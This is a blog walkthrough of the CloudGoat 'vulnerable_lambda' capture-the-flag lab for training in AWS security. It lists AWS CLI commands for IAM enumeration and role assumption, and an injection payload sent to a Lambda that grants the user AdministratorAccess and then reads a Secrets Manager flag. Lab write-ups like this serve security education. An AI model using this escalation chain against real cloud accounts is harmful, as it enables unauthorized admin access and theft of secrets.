---
title:  "Breakdown: Cloudgoat Vulnerable Lambda"
date:   2024-03-05
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-05
---

## Cloudgoat

Cloudgoat is a cybersecurity lab which created by [Rhino Security Labs](https://rhinosecuritylabs.com/), allows you to learn about cloud cybersecurity by completing CTF scenarios. Learn more about [Cloudgoat](https://github.com/RhinoSecurityLabs/cloudgoat).

In this blog, I will break down each steps on the `vulnerable_lambda` scenario.
 
## vulnerable_lambda Scenario

In this scenario, you will play as a user name `bilbo`, try to exploit the compromised IAM role, and get the secret!

### Create bilbo profile

After you created the scenario with command `./cloudgoat.py create vulnerable_lambda`, it will give you `AccessKeyId` and `SecretAccessKey` for the `bilbo` user

Then you can create profile to use for this scenario with `bilbo` name or whatever name you want, but in this blog, we will stick with `bilbo` as the original walkthrough.

You can create profile by this command
```shell
aws configure --profile [profile-name-that-you-want]
```

And then it will ask for `AccessKeyId`, `SecretAccessKey`, region and format.

Done.

Additionally, I will left with one more command
```shell
aws configure --profile [profile-name] set aws_session_token [session-token]
```

You will need this command for some steps in this scenario.

### Get permissions of the `bilbo` user

To get the `bilbo` user's permissions
```shell
aws --profile bilbo --region us-east-1 sts get-caller-identity
```

Result:
```json
{
    "UserId": "###",
    "Account": "###",
    "Arn": "arn:aws:iam::###:user/cg-bilbo-vulnerable_lambda_###"
}
```

`cg-bilbo-vulnerable_lambda_###` is the username of `bilbo` user

__Note:__ You will get the different value on `###`
{: .notice--info}


Now, to get all attached policies to this user
```shell
aws --profile bilbo --region us-east-1 iam list-user-policies --user-name [bilbo-user-name]
```

After running the above cli, you will get the policy name
```json
{
    "PolicyNames": [
        "cg-bilbo-vulnerable_lambda_###-standard-user-assumer"
    ]
}
```

Then, you will get all policy names that are attached to this user. In this case you will have one policy name `cg-bilbo-vulnerable_lambda_###-standard-user-assumer`

To get the permission that each policies have
```shell
aws --profile bilbo --region us-east-1 iam get-user-policy --user-name [your_user_name] --policy-name [your_policy_name]
```

Result:
```json
{
    "UserName": "cg-bilbo-vulnerable_lambda_###",
    "PolicyName": "cg-bilbo-vulnerable_lambda_###-standard-user-assumer",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::###:role/cg-lambda-invoker*",
                "Sid": ""
            },
            {
                "Action": [
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": ""
            }
        ]
    }
}
```

As you can see this bilbo user has role `cg-lambda-invoker*` and the permission to get and list everything in IAM, and use the IAM policy simulator.

### List all roles and assume a role for privilege escalation

```shell
aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
```

The command above will list all the roles in the account and we pipe with command `grep cg-` to find our target role `cg-lambda-invoker*`.
```
RoleName": "cg-lambda-invoker-vulnerable_lambda_###",
"Arn": "arn:aws:iam::###:role/cg-lambda-invoker-vulnerable_lambda_###",
"AWS": "arn:aws:iam::###:user/cg-bilbo-vulnerable_lambda_###"
```

Now, you got the target role name `cg-lambda-invoker-vulnerable_lambda_###` with arn `arn:aws:iam::###:role/cg-lambda-invoker-vulnerable_lambda_###`

and get the attached policy with 
```shell
aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
```

Result:
```json
{
    "PolicyNames": [
        "lambda-invoker"
    ]
}
```

To see what policy name `lambda-invoker` from role `cg-lambda-invoker-vulnerable_lambda_###` can do,
```shell
aws --profile bilbo --region us-east-1 iam get-role-policy --role-name [role-name] --policy-name [policy-name]
```

Result:
```json
{
    "RoleName": "cg-lambda-invoker-###",
    "PolicyName": "lambda-invoker",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "lambda:ListFunctionEventInvokeConfigs",
                    "lambda:InvokeFunction",
                    "lambda:ListTags",
                    "lambda:GetFunction",
                    "lambda:GetPolicy"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:lambda:us-east-1:###:function:###-policy_applier_lambda1"
            },
            {
                "Action": [
                    "lambda:ListFunctions",
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
```

You will see that the assumed role can list all lambdas in the account, and get function which has arn `arn:aws:lambda:us-east-1:###:function:###-policy_applier_lambda1`

And to get the credential,
```shell
aws --profile bilbo --region us-east-1 sts assume-role --role-arn [role-arn] --role-session-name [whatever-you-want]
```

You will get the `AccessKeyId`, `SecretAccessKey`, and `SessionToken`
```json
{
    "Credentials": {
        "AccessKeyId": "###",
        "SecretAccessKey": "###",
        "SessionToken": "###",
        "Expiration": "2024-03-07T09:44:04+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "###:lambda-session",
        "Arn": "arn:aws:sts::###:assumed-role/cg-lambda-invoker-vulnerable_lambda_###/lambda-session"
    }
}
```

Now, you need to create new profile for assumed role. See the create profile step above, and do not forget to set the session token in the profile.

### List lambdas to identify the target lambda

To list all lambda in the account
```shell
aws --profile [assumed-role-profile] --region us-east-1 lambda list-functions
```

Result:
```json
{
    "Functions": [
        {
            "FunctionName": "vulnerable_lambda_###-policy_applier_lambda1",
            "FunctionArn": "arn:aws:lambda:us-east-1:291364365093:function:vulnerable_lambda_###-policy_applier_lambda1"
        }
    ]
}
```

You will see the function name `vulnerable_lambda_###-policy_applier_lambda1` which had arn `arn:aws:lambda:us-east-1:291364365093:function:vulnerable_lambda_###-policy_applier_lambda1`

### Look at the target lambda source code

To get our target lambda source code, you need to run
```shell
aws --profile assumed_role --region us-east-1 lambda get-function --function-name [lambda-name]
```

Result:
```json
{
    "Configuration": {
        "FunctionName": "vulnerable_lambda_###-policy_applier_lambda1",
        "FunctionArn": "arn:aws:lambda:us-east-1:###:function:vulnerable_lambda_###-policy_applier_lambda1"
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "s3 link to download source code"
    }
}
```

You will get link to download source code on the `Location` key.

When you read the code, mostly the code do is attaching the policy for the target user.

### Invoke administrator policy for `bilbo` user

To exploit the lambda to attached administrator access policy to `bilbo`, you need to run
```shell
aws --profile assumed_ld_invoker --region us-east-1 lambda invoke --function-name [function-name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": "[bilbo-user-name]"}' [whatever-file-name-you-want].txt
```

To see the output,
```shell
cat [whatever-file-name-you-want].txt
```

To confirm that `bilbo` user got the `AdministratorAccess` policy,
```shell
aws --profile bilbo --region us-east-1 iam list-attached-user-policies --user-name [bilbo-user-name]
```

You will see result like this
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

### Get secret!

This command will list all the secrets the account have
```shell
aws --profile bilbo --region us-east-1 secretsmanager list-secrets
```

Result:
```json
{
    "SecretList": [
        {
            "Name": "vulnerable_lambda_###-final_flag",
        }
    ]
}
```
You will see a secret name `vulnerable_lambda_###-final_flag`

Finally, to get the secret value
```shell
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [secret-name]
```

Result:
```json
{
    "SecretString": "cg-secret-XXXXXX-XXXXXX"
}
```